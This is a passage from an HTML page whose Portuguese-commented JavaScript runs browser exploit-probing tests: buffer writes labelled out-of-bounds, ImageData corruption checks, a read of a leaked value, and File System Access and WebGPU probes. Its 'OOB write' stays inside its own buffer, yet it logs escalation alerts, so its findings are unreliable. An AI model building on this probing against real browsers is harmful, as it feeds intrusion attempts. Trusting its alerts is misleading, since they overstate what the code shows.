RGBA=(${r},${g},${b},${a})`, 'critical', FNAME); potentialCorruptionDetected = true; const byte1 = writeValue1 & 0xFF; const byte2 = (writeValue1 >> 8) & 0xFF; const byte3 = (writeValue1 >> 16) & 0xFF; const byte4 = (writeValue1 >> 24) & 0xFF; let matchesPattern = false; if (r === byte1 && g === byte2 && b === byte3 && a === byte4) { matchesPattern = true; logCanvas(`    -> Padrão OOB 1 (0x${writeValue1.toString(16)}) detectado!`, 'vuln', FNAME); } if (matchesPattern) { patternMatched = true; logCanvas(` ---> *** ALERTA: Padrão OOB lido ImageData! Corrupção Controlada! ***`, 'escalation', FNAME); } break; } } }catch(e){ logCanvas(`Erro put/getImageData ${i}: ${e.message}`, 'error', FNAME); console.error(`Erro ImgData ${i}:`, e); potentialCorruptionDetected = true; } if(i % 5 === 0) await PAUSE(5); } if (patternMatched) { logCanvas(`SUCESSO: Corrupção detectada E padrão OOB lido ImageData!`, 'vuln', FNAME); } else if (potentialCorruptionDetected) { logCanvas(`AVISO: Corrupção/Erro detectado ImageData, padrão OOB N/A.`, 'warn', FNAME); logCanvas(` ---> *** ALERTA: Corrupção memória instável afetando ImageData! ***`, 'escalation', FNAME); } else if (oobWritePerformed) { logCanvas(`Escrita OOB OK, nenhuma corrupção detectada ImageDatas.`, 'good', FNAME); } else { logCanvas(`Escrita OOB N/A/falhou, nenhuma corrupção detectada.`, 'good', FNAME); } logCanvas("--- Teste OOB Write -> ImageData Check Concluído ---",'test', FNAME); await PAUSE();};
        const testOOBWriteOnly = async () => { /* ...código v18 inalterado... */ const FNAME = 'testOOBWriteOnly'; logCanvas("--- Teste: OOB Write Only (Trigger) ---",'test', FNAME); const bufferOOBSize=64; const writeValue1=0xDEADBEEF; const writeValue2=0xCAFEBABE; const writeValueSize = 8; const allocationSize = bufferOOBSize + 256; const baseOffsetInBuffer = 128; let bufferOOB=null; let dv=null; let writeSuccess=false; try{ bufferOOB=new ArrayBuffer(allocationSize); dv=new DataView(bufferOOB); for(let i=0; i<bufferOOB.byteLength; i++)dv.setUint8(i, 0xDD); }catch(e){ logCanvas(`Erro alocar buffer ctrl: ${e.message}`,'error', FNAME); console.error(e); return false; } const oobWriteOffset = bufferOOBSize; const targetWriteAddr = baseOffsetInBuffer + oobWriteOffset; const relOffsetStr = `@${oobWriteOffset} (addr ${targetWriteAddr})`; try{ if(targetWriteAddr >= 0 && targetWriteAddr + writeValueSize <= bufferOOB.byteLength){ dv.setUint32(targetWriteAddr, writeValue1, true); dv.setUint32(targetWriteAddr + 4, writeValue2, true); logCanvas(`Escrita OOB U32x2 @ ${relOffsetStr} OK.`, 'vuln', FNAME); logCanvas(` ---> *** ALERTA: Primitivo Relevante (OOB Write) ***`, 'escalation', FNAME); writeSuccess=true; } else { logCanvas(`Offset OOB ${relOffsetStr} fora buffer.`, 'error', FNAME); } }catch(e){ logCanvas(`Escrita OOB U32x2 falhou @ ${relOffsetStr}: ${e.message}`, 'good', FNAME); } logCanvas("--- Teste OOB Write Only Concluído ---",'test', FNAME); await PAUSE(); return writeSuccess;};
        const testFileSystemAccess = async () => { /* ...código v18 inalterado... */ const FNAME = 'testFileSystemAccess'; logCanvas("--- Teste: File System Access API Check ---", 'test', FNAME); let apiAvailable = false; let openFilePickerCalled = false; let saveFilePickerCalled = false; let dirPickerCalled = false; let errorMsg = null; if (window.showOpenFilePicker) { apiAvailable = true; try { window.showOpenFilePicker().then(handles => {}).catch(err => {}); openFilePickerCalled = true; await PAUSE(100); } catch (e) { errorMsg = e.message; } } else { logCanvas("API showOpenFilePicker N/A.", 'good', FNAME); } await PAUSE(MEDIUM_PAUSE_CANVAS); if (window.showSaveFilePicker) { apiAvailable = true; try { window.showSaveFilePicker().then(handle => {}).catch(err => {}); saveFilePickerCalled = true; await PAUSE(100); } catch (e) { if (!errorMsg) errorMsg = e.message; } } else { logCanvas("API showSaveFilePicker N/A.", 'good', FNAME); } await PAUSE(MEDIUM_PAUSE_CANVAS); if (window.showDirectoryPicker) { apiAvailable = true; try { window.showDirectoryPicker().then(handle => {}).catch(err => {}); dirPickerCalled = true; await PAUSE(100); } catch (e) { if (!errorMsg) errorMsg = e.message; } } else { logCanvas("API showDirectoryPicker N/A.", 'good', FNAME); } if (!apiAvailable) { logCanvas("API File System Access N/A.", 'good', FNAME); } else if (errorMsg) { logCanvas(`Erro APIs File System Access: ${errorMsg}`, 'error', FNAME); } else { logCanvas("Chamadas APIs File System Access OK (sem erro sync).", 'good', FNAME); } logCanvas(`--- Teste File System Access Concluído (Disp: ${apiAvailable}, Erro Sync: ${!!errorMsg}) ---`, 'test', FNAME); await PAUSE(); };
        const testWebGPUCheck = async () => { /* ...código v18 inalterado... */ const FNAME = 'testWebGPUCheck'; logCanvas("--- Teste: WebGPU Check ---", 'test', FNAME); let adapterOK = false; let deviceOK = false; let errorMsg = null; gpuAdapter = null; gpuDevice = null; if (!navigator.gpu) { logCanvas("WebGPU API N/A.", 'good', FNAME); logCanvas(`--- Teste WebGPU Concluído (API N/A) ---`, 'test', FNAME); await PAUSE(); return; } logCanvas("WebGPU API disponível.", 'good', FNAME); try { gpuAdapter = await navigator.gpu.requestAdapter(); if (gpuAdapter) { logCanvas(`Adaptador GPU obtido`, 'good', FNAME); adapterOK = true; try { gpuDevice = await gpuAdapter.requestDevice(); if (gpuDevice) { logCanvas("Dispositivo GPU obtido.", 'good', FNAME); deviceOK = true; gpuDevice.addEventListener('uncapturederror', (event) => { logCanvas(`--> ERRO WebGPU: ${event.error.message}`, 'critical', FNAME);}); gpuDevice.lost.then((info) => { logCanvas(`--> Dispositivo WebGPU PERDIDO! R: ${info.reason}.`, 'critical', FNAME); gpuDevice = null; }); try { const buffer = gpuDevice.createBuffer({ size: 16, usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST }); buffer.destroy(); } catch(bufferError) {} } else { errorMsg = "requestDevice null"; } } catch (deviceError) { errorMsg = deviceError.message; } } else { errorMsg = "requestAdapter null"; } } catch (adapterError) { errorMsg = adapterError.message; } if(errorMsg) logCanvas(`Erro WebGPU: ${errorMsg}`, 'error', FNAME); logCanvas(`--- Teste WebGPU Concluído (Adaptador: ${adapterOK}, Disp: ${deviceOK}, Erro: ${!!errorMsg}) ---`, 'test', FNAME); await PAUSE(); };

        // Função Principal Canvas (v18 com Debug Alertas)
        const runCanvasTestSequence = async () => {
            const FNAME = 'runCanvasTestSequence';
            outputDivCanvas = document.getElementById('output-canvas'); coordStatusDiv = document.getElementById('canvas-coord-status'); canvasElement = document.getElementById('interactive-canvas'); const runBtnCanvas = document.getElementById('runCanvasBtn');
            if (!outputDivCanvas || !runBtnCanvas || !canvasElement || !coordStatusDiv) {
                 alert("DEBUG: Erro Fatal S2: Elementos HTML essenciais não encontrados! Verifique IDs: output-canvas, interactive-canvas, canvas-coord-status, runCanvasBtn");
                 console.error("Erro Fatal S2: Elementos HTML essenciais não encontrados!");
                 return;
            }
            if (runBtnCanvas) runBtnCanvas.disabled = true; outputDivCanvas.innerHTML = '';
             alert("DEBUG: Iniciando runCanvasTestSequence..."); // Alerta 1
            logCanvas("Iniciando sequência focada do Script 2 (v18)...", "test", FNAME);
            imgSquares.length = 0; let sqX = 10; let sqY = imgSquaresStartY; const squareDefs = [ { id: 'imgSq0', text: 'Meta', color: '#FF5733', action: testOOBWriteMetadata }, { id: 'imgSq1', text: 'WebGL', color: '#C70039', action: testWebGLDeeperPlus }, { id: 'imgSq2', text: 'ImgDt', color: '#900C3F', action: testOOBWriteToImageDataCheck }, { id: 'imgSq3', text: 'File', color: '#581845', action: testFileSystemAccess }, { id: 'imgSq4', text: 'GPU', color: '#FFC300', action: testWebGPUCheck }, { id: 'imgSq5', text: 'Link', color: '#337BFF', url: 'https://github.com/' } ]; squareDefs.forEach(def => { imgSquares.push({ id: def.id, x: sqX, y: sqY, size: imgSquareSize, color: def.color, text: def.text, hover: false, url: def.url, action: def.action }); sqX += imgSquareSize + imgSquareSpacing; if (sqX + imgSquareSize > canvasElement.width - 10) { sqX = 10; sqY += imgSquareSize + imgSquareSpacing; } });

            try {
                 alert("DEBUG: Obtendo contexto 2D..."); // Alerta 2
                 try { ctx = canvasElement.getContext('2d'); if (!ctx) throw new Error("Falha Ctx 2D."); } catch(e) { logCanvas(`Falha Ctx 2D: ${e.message}`, 'critical', FNAME); throw e; }
                 redrawAll(); await PAUSE();
                 alert("DEBUG: Lendo leak S1..."); // Alerta 3
                 try { if (typeof leakedValueFromOOB !== 'undefined' && leakedValueFromOOB) { const l = leakedValueFromOOB; const ls = l.type==='U64' ? `L(S1):U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}` : `L(S1):U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> Leak S1: ${ls}`, 'leak', FNAME); currentLeakData = {text: ls, color: "#FF9800"};} else { logCanvas(`-> Leak S1 Nulo/N/A.`, 'warn', FNAME); currentLeakData = {text:"L(S1):N/A", color:"#aaa"}; } } catch (e) { logCanvas(`Erro leak S1: ${e.message}`, 'error', FNAME); currentLeakData = {text:"L(S1):ERRO", color:"#F44336"}; }
                 redrawAll(); await PAUSE();

                // *** Sequência de Testes S2 Automáticos (v18) ***
                 alert("DEBUG: Iniciando testWebGLCheck..."); // Alerta 4
                await testWebGLCheck(); await PAUSE(SHORT_PAUSE_CANVAS);

                 alert("DEBUG: Iniciando testAdvancedPP..."); // Alerta 5
                await testAdvancedPP(); await PAUSE(MEDIUM_PAUSE_CANVAS);

                 alert("DEBUG: Iniciando testPPGadgetImpact..."); // Alerta 6
                await testPPGadgetImpact(); await PAUSE(MEDIUM_PAUSE_CANVAS);

                 alert("DEBUG: Iniciando testOOBReadEnhanced..."); // Alerta 7
                await testOOBReadEnhanced(); await PAUSE(MEDIUM_PAUSE_CANVAS);

                 alert("DEBUG: Iniciando testOOBWriteMetadata..."); // Alerta 8
                 await testOOBWriteMetadata(); await PAUSE(MEDIUM_PAUSE_CANVAS);

                 alert("DEBUG: Iniciando testComplexCanvas..."); // Alerta 9
                 await testComplexCanvas(); await PAUSE(MEDIUM_PAUSE_CANVAS);

                 alert("DEBUG: Iniciando Interação OOB->WebGL..."); // Alerta 10
                 logCanvas("--- Teste Interação OOB Write -> WebGL ---", 'test', FNAME);
                 const oobWriteInteractionOK = await testOOBWriteOnly();
                 await testWebGLDeeperPlus(); // Pulado
                 logCanvas("--- Teste Interação OOB Write -> WebGL Concluído ---", 'test', FNAME);
                 await PAUSE(SHORT_PAUSE_CANVAS);

                 alert("DEBUG: Iniciando testOOBWriteToImageDataCheck..."); // Alerta 11
                 await testOOBWriteToImageDataCheck(); await PAUSE(SHORT_PAUSE_CANVAS);

                 alert("DEBUG: Iniciando testFileSystemAccess..."); // Alerta 12
                 await testFileSystemAccess(); await PAUSE(SHORT_PAUSE_CANVAS);

                 alert("DEBUG: Iniciando testWebGPUCheck..."); // Alerta 13
                 await testWebGPUCheck(); await PAUSE(SHORT_PAUSE_CANVAS);

                 alert("DEBUG: Fim da Sequência Automática."); // Alerta 14
                 logCanvas("--- Sequência principal de testes concluída ---", 'test', FNAME);
                 await PAUSE(100);

                 // Adicionar Listeners Interativos
                 alert("DEBUG: Adicionando Listeners..."); // Alerta 15
                 if(canvasClickListener && canvasElement) { try { canvasElement.removeEventListener('click', canvasClickListener); } catch(e){} } if(canvasMoveListener && canvasElement) { try { canvasElement.removeEventListener('mousemove', canvasMoveListener); } catch(e){} }
                 canvasMoveListener = (event) => { /* ...código inalterado... */ const rect = canvasElement.getBoundingClientRect(); const x = event.clientX - rect.left; const y = event.clientY - rect.top; let needsRedraw = false; let newHoverTarget = null; let cursorStyle = 'default'; interactiveAreas.forEach(a => { if (x >= a.x && x <= a.x + a.w && y >= a.y && y <= a.y + a.h) { newHoverTarget = a.id; cursorStyle = 'pointer'; } }); imgSquares.forEach(sq => { let oldHover = sq.hover; sq.hover = false; if (x >= sq.x && x <= sq.x + sq.size && y >= sq.y && y <= sq.y + sq.size) { newHoverTarget = sq.id; cursorStyle = sq.url ? 'pointer' : 'crosshair'; sq.hover = true; } if(oldHover !== sq.hover) needsRedraw = true; }); if (newHoverTarget !== currentHoverTarget) { currentHoverTarget = newHoverTarget; needsRedraw = true; } try { if(needsRedraw){ redrawAll(); } canvasElement.style.cursor = cursorStyle; if(coordStatusDiv) coordStatusDiv.textContent=`Coords: X=${x.toFixed(0)}, Y=${y.toFixed(0)}`; } catch(e){ logCanvas(`Erro mousemove: ${e.message}`, 'error', 'MouseMove'); console.error(e); } };
                 canvasClickListener = async (event) => { /* ...código inalterado v18... */ const FNAME_CLICK = 'CanvasClick'; try { const rect = canvasElement.getBoundingClientRect(); const x = event.clientX - rect.left; const y = event.clientY - rect.top; let clickedArea = null; interactiveAreas.forEach(a => { if (x >= a.x && x <= a.x + a.w && y >= a.y && y <= a.y + a.h) { clickedArea = a; } }); let clickedSquare = null; imgSquares.forEach((sq) => { if (x >= sq.x && x <= sq.x + sq.size && y >= sq.y && y <= sq.y + sq.size) { clickedSquare = sq; } }); if (clickedArea) { logCanvas(`Click Área: ${clickedArea.text} (ID: ${clickedArea.id})`, 'info', FNAME_CLICK); switch (clickedArea.id) { case 'rect-log': logCanvas('Click botão log.', 'info', FNAME_CLICK); break; case 'rect-link': logCanvas('Abrindo link externo...', 'info', FNAME_CLICK); try { window.open('https://google.com', '_blank'); } catch (e) { logCanvas('Erro window.open: ' + e.message, 'error', FNAME_CLICK); } break; case 'rect-rerun': logCanvas('Re-lendo leak S1...', 'info', FNAME_CLICK); try { if(typeof leakedValueFromOOB !== 'undefined' && leakedValueFromOOB){ const l=leakedValueFromOOB; const ls=l.type==='U64'?`L(S1):U64 H=${toHexCanvas(l.high)} L=${toHexCanvas(l.low)}@${l.offset}`:`L(S1):U32 ${toHexCanvas(l.low)}@${l.offset}`; logCanvas(`-> Re-read Leak S1: ${ls}`,'leak', FNAME_CLICK); currentLeakData={text:ls, color:"#FF9800"};} else { logCanvas(`-> Re-read Leak S1: Nulo/N/A`, 'warn', FNAME_CLICK); currentLeakData={text:"L(S1):N/A", color:"#aaa"};} }catch(e){ logCanvas(`Erro re-ler leak S1: ${e.message}`,'error', FNAME_CLICK);} redrawAll(); break; } } else if (clickedSquare) { logCanvas(`Click Quadrado ID: ${clickedSquare.id} (Texto: ${clickedSquare.text})`, 'vuln', FNAME_CLICK); if (clickedSquare.url) { logCanvas(`Abrindo URL: ${clickedSquare.url}`, 'info', FNAME_CLICK); try { window.open(clickedSquare.url, '_blank'); } catch (e) { logCanvas('Erro window.open: ' + e.message, 'error', FNAME_CLICK); } } else if (clickedSquare.action && typeof clickedSquare.action === 'function') { let actionError = null; if (runBtnCanvas) runBtnCanvas.disabled = true; logCanvas(`Executando re-run ${clickedSquare.id} (${clickedSquare.action.name})...`, 'test', FNAME_CLICK); try { await clickedSquare.action(); logCanvas(`Re-run ${clickedSquare.id} OK.`, 'good', FNAME_CLICK); } catch (e) { logCanvas(`Erro re-run ${clickedSquare.id}: ${e.message}`, 'error', FNAME_CLICK); console.error(`Erro ação ${clickedSquare.id}:`, e); actionError = e; } finally { clickedSquare.color = actionError ? 'orange' : 'purple'; redrawAll(); if (runBtnCanvas) runBtnCanvas.disabled = false; logCanvas(`Re-run ${clickedSquare.id} finalizado.`, 'test', FNAME_CLICK); } } else { logCanvas(`Nenhuma ação definida para ${clickedSquare.id}.`, 'info', FNAME_CLICK); } } } catch (e) { logCanvas(`Erro GERAL listener clique: ${e.message}`, 'error', FNAME_CLICK); console.error(e); if (runBtnCanvas) runBtnCanvas.disabled = false; } };
                 canvasElement.addEventListener('click', canvasClickListener);
                 canvasElement.addEventListener('mousemove', canvasMoveListener);
                 redrawAll();
                 alert("DEBUG: Setup completo. Testes automáticos finalizados."); // Alerta Final

            } catch(e) {
                 logCanvas(`Erro GERAL SCRIPT 2: ${e.message}`, 'critical', FNAME); console.error("Erro GERAL SCRIPT 2:", e); if(e.stack) console.error(e.stack);
                 alert(`DEBUG: Erro GERAL no Script 2: ${e.message}`); // Alerta em caso de erro geral
             }
             finally {
                 logCanvas("--- Fim da execução Script 2 ---", 'test', FNAME);
                 if (runBtnCanvas) runBtnCanvas.disabled = false; // Re-habilita botão no final
             }
        };

        // Funções wrapper e unload (Inalteradas)
        const runCanvasTest = async () => { await runCanvasTestSequence(); };
        window.addEventListener('unload', () => { try { if (canvasClickListener && canvasElement) canvasElement.removeEventListener('click', canvasClickListener); if (canvasMoveListener && canvasElement) canvasElement.removeEventListener('mousemove', canvasMoveListener); gpuDevice = null; gpuAdapter = null; } catch(e) {} console.log("[Canvas Unload] Limpeza OK."); });

        // Comentário importante sobre limitações:
        // Este script testa vulnerabilidades DENTRO do ambiente do navegador (renderer).
        // Ele NÃO PODE testar diretamente ou explorar vulnerabilidades de Kernel ou IPC
        // para escalonamento de privilégios (sandbox escape). Isso requer código nativo
        // e técnicas fora do escopo do JavaScript sandboxed.
    </script>

</body>
</html>
